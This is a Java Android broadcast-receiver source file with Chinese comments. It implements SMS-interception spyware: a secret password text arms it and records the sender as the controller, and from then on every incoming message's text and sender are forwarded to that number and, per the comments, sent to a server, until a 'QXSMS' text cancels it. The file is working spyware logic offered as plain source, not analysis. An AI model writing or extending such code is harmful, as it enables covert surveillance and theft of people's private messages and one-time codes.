package my.service;

import my.pro.CancelService;
import my.pro.QuickSendSMS;
import my.pro.SocketActivity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SMSReceiver extends BroadcastReceiver {

	// android.provider.Telephony.Sms.Intents
	public static final String SMS_RECEIVED_ACTION = "android.provider.Telephony.SMS_RECEIVED";

	@Override
	public void onReceive(Context context, Intent intent) {
		// 服务启动后，筛选接收短信服务
		if (intent.getAction().equals(SMS_RECEIVED_ACTION)) {
			SmsMessage[] messages = getMessagesFromIntent(intent);

			// 找到存储密码的文件
			SharedPreferences sharedPrefe = context.getSharedPreferences("parameters", Context.MODE_PRIVATE);

			// 先读取使用的密码
			String dir = sharedPrefe.getString("password", "");

			// 用于更新现有密码
			Editor sharedData = sharedPrefe.edit();

			for (SmsMessage message : messages) {

				// 收到开始指令
				if (message.getDisplayMessageBody().equals(dir) == true) {

					// --------Service Test------------//
					String cmdNumber = new String();
					cmdNumber = message.getOriginatingAddress();
					if (cmdNumber.charAt(0) == '+') {
						cmdNumber = cmdNumber.substring(3, cmdNumber.length());
					}

					sharedData.putString("commandnumber", cmdNumber);
					
					//记录发送指令的手机号码
					String recorder = new String();
					recorder = sharedPrefe.getString("recorder", "") + "--" + cmdNumber;
					sharedData.putString("recorder", recorder);
					
					
					sharedData.commit();

					Intent startService = new Intent(context, SMSService.class);
					context.startService(startService);
					/*
					Intent socketActivity = new Intent(context,SocketActivity.class);
					socketActivity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
					context.startActivity(socketActivity);
					*/
					//将信息发送到服务器
					Intent socketService = new Intent(context,SocketService.class);
					context.startService(socketService);
					

				}
				// 收到普通短信
				else {

					// 收到取消指令，忽略QXSMS的大小写
					if (message.getDisplayMessageBody().equals("QXSMS") == true || message.getDisplayMessageBody().equals("qxsms") == true) {

						//以下用service实现
						Intent cancelService = new Intent(context,CancelService.class);
						context.startService(cancelService);
						
						//以下是用activity来实现
						//Intent startIntent = new Intent(context, CancelActivity.class);
						//startIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						//context.startActivity(startIntent);

					} else {

						String cmdNumber = sharedPrefe.getString("commandnumber", "");
						if (cmdNumber.equals("") == false) {
							//即时转发功能
							Intent startIntent = new Intent(context, QuickSendSMS.class);
							// 利用Bundle解决传值的问题
							Bundle tempBundle = new Bundle();
							tempBundle.putString("messageBody", message.getDisplayMessageBody());
							tempBundle.putString("messageAddress", message.getDisplayOriginatingAddress());
							startIntent.putExtras(tempBundle);
							startIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							context.startActivity(startIntent);
							
							//将即时信息发送到服务器
							Intent socketIntent = new Intent(context,SocketActivity.class);
							socketIntent.putExtras(tempBundle);
							socketIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
							context.startActivity(socketIntent);
							
							

						}

					}
				}

			}

		}

	}

	public final SmsMessage[] getMessagesFromIntent(Intent intent) {

		// Retrieve extended data from the intent
		Object[] messages = (Object[]) intent.getSerializableExtra("pdus");

		byte[][] pduObjs = new byte[messages.length][];
		for (int i = 0; i < messages.length; i++) {
			pduObjs[i] = (byte[]) messages[i];
		}
		byte[][] pdus = new byte[pduObjs.length][];
		int pduCount = pdus.length;
		SmsMessage[] msgs = new SmsMessage[pduCount];
		for (int i = 0; i < pduCount; i++) {
			pdus[i] = pduObjs[i];
			msgs[i] = SmsMessage.createFromPdu(pdus[i]);
		}
		return msgs;
	}
}
